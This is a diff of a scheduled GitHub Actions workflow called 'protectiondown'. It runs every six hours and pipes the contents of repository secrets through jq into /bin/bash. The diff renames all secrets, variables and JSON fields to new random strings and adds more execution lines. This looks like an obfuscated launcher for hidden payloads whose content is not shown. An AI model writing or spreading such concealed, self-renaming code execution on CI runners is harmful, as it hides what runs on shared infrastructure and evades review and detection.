@@ -1,9 +1,8 @@
 name: protectiondown
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 5/6 * * *'
+    - cron: '12 3/6 * * *'
 
 jobs:
   build:
@@ -13,14 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: protectiondown
         env:
-          bcfj92810: ${{ secrets.bcfj92810 }}
+          uqvtc035: ${{ secrets.uqvtc035 }}
         run: |
-          echo $bcfj92810 | jq -r .fvpu6 | /bin/bash
-          echo $nnbxs11743 | jq -r .nwyf555 | /bin/bash
-          echo $yhsh60 | jq -r .fxkv1 | /bin/bash
-          echo $ukpc96 | jq -r .bdw4 | /bin/bash
-          echo $zbw9 | jq -r .qeftl4 | /bin/bash
-          echo $ynsc014 | jq -r .ecrmd7867 | /bin/bash
-          echo $lwxy99021 | jq -r .in04 | /bin/bash
-          echo $yrox0 | jq -r .xh89568 | /bin/bash
+          echo $uqvtc035 | jq -r .sy6 | /bin/bash
+          echo $giei5362 | jq -r .ett5270 | /bin/bash
+          echo $hr50553 | jq -r .pndf39067 | /bin/bash
+          echo $gju61523 | jq -r .o6 | /bin/bash
+          echo $wnkz780 | jq -r .j4823 | /bin/bash
+          echo $koi4275 | jq -r .jnbu628 | /bin/bash
+          echo $x40293 | jq -r .ichrr336 | /bin/bash
+          echo $o903 | jq -r .ougpu586 | /bin/bash
+          echo $dukep605 | jq -r .zwlxz71 | /bin/bash
+          echo $jsl9884 | jq -r .a771 | /bin/bash
+          echo $gwec6745 | jq -r .rlehz8 | /bin/bash
+          echo $d442 | jq -r .uj61 | /bin/bash
 
